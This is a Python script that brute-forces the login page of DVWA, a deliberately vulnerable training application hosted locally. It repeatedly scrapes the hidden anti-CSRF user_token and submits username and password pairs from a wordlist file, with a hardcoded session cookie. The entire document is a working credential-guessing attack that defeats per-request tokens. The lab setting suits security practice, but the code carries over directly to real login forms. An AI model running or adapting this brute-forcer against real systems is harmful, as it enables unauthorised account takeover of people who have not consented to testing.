import requests
from bs4 import BeautifulSoup
import sys
import re

get_user_token = re.compile(r'(?<=value=").*?(?=")')


def get_token(url):
    header = {
        'Host': 'dvwa.localhost',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1',
        'Accept-Language': 'zh-cn',
        'Connection': 'close',
        'Cookie': 'PHPSESSID=5tmkqrhm1gve2r9ap450c6m6m2; security=high',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0.3 Safari/604.5.6'
    }
    #rep.text为服务器返回的内容
    rep = requests.get(url, headers=header)
    # print(rep.text)
    rep.encoding = 'utf-8'
    soup = BeautifulSoup(rep.text, "lxml")
    print(len(rep.text))
    input_list = soup.find('input', type="hidden")
    user_token = get_user_token.search(str(input_list)).group()
    return user_token


if __name__ == '__main__':
    user_token = get_token("http://dvwa.localhost/vulnerabilities/brute/")
    with open('dic.txt') as f:
        i = 0
        for item in f.readlines():
            pos = item.rfind(",")
            username = item[:pos]
            password = item[pos + 1:]
            requrl = "http://dvwa.localhost/vulnerabilities/brute/" + "?username=" + username.strip() + \
                     "&password=" + password.strip() + "&Login=Login&user_token=" + user_token
            i += 1
            print(i, username.strip(), password.strip());
            user_token = get_token(requrl)
